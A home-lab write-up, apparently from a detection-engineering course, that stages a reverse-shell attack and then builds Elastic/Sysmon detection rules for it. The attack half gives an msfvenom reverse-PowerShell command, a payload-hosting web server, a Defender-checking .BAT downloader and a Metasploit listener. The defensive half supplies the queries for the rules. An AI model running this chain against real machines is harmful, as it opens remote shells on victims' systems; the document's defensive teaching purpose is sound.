# Detection Engineering Attack Scenario 2

This attack:
* Uses MSFvenom to create a PowerShell reverse shell and hosts it on a python web server on the Kali attacker VM
* Creates a malicous .BAT file that checks if the Windows victim VM has Windows Defender RealTimeProtection **disabled** and downloads the malicious payload from the Kali attacker VM
* Launches a reverse TCP handler on the Kali attacker VM listening for a connection from the WIndows victim VM

## Attack Staging
1. On the Kali attacker VM, use MSFvenom to create a malicious .BAT file containing a reverse PowerShell payload
```
msfvenom -p cmd/windows/reverse_powershell lhost=[Windows victim VM IP] lport=4242 > shell.txt
```
Example found [here](https://github.com/Aquellis/TCM-Courses/blob/main/DetEng/Attack2/attack2_Shell.txt)

2. On the Kali attacker VM, spin up a web server hosting the malicious file created in step 1
```
python -m http.server
```

3. On the Windows victim VM, create a malicious .BAT file that checks whether the VM has RealTimeProtection **disabled**, if so then downloads and executes the reverse shell payload hosted by the Kali attacker VM
Example found [here](https://github.com/Aquellis/TCM-Courses/blob/main/DetEng/Attack2/attack2.bat)

4. On the Kali attacker VM, launch msfconsole and start a listener for the reverse shell connection:
```
use exploit/multi/handler
set lhost [Kali attacker VM IP]
set lport 4242
run
```

## Attack Walkthrough
1. In the Ubuntu VM, start the Zeek service: <br>
in **/opt/zeek/bin** run: 
```
./zeekctl
deploy 
```

2. Execute the malicous .BAT file on the Windows victim VM (created in step 3 of Attack Staging)

3. A Windows shell should have popped in the Kali attacker VM terminal window <br>
![kaliRevShell](../../Images/AttScen2_shell)

## Rule & Alert Creation

### Create the First Rule: PowerShell Execution via a .BAT File
Open the Elastic logs, use the **event.dataset: "windows.sysmon_operational"** data source and use the search query: <br>
```
process.command_line: powershell* and process.parent.name : "cmd.exe"
```
Create a new rule based on this custom query:
* Suppress the rule by **host.hostname** and per time period of **5 minutes**
* Schedule the rule to run every **5 minutes** with a lookback time of **5 minutes** 

### Create the Second Rule: Invoke-WebRequest Downloading a .BAT File
Open the Elastic logs, use the **event.dataset: "windows.sysmon_operational"** data source and use the search query: <br>
```
process.parent.name : "powershell.exe" and process.parent.command_line : *Invoke-WebRequest* and process.command_line: *bat*
```
Create a new rule based on this custom query:
* Suppress the rule by **host.hostname** and per time period of **5 minutes**
* Schedule the rule to run every **5 minutes** with a lookback time of **5 minutes** 

### Create the Third Rule: MSFVenom Created a Return Shell
Open the Elastic logs, use the **event.dataset: "windows.sysmon_operational"** data source and use the search query: <br>
```
process.command_line : "\"cmd.exe\"" and message: "*powershell -w hidden -nop -c $a'*"
```
The **message** field must be used here since the **process.parent.command_line** field is too long and is being ignored by Elastic: <br>
![AttScen2_rule3](../../Images/AttScen2_rule3)

Create a new rule based on this custom query:
* Suppress the rule by **host.hostname** and per time period of **5 minutes**
* Schedule the rule to run every **5 minutes** with a lookback time of **5 minutes** 

## Confirm the Alert Works
Re-launch the attacks as given in the **Attack Walkthrough** section
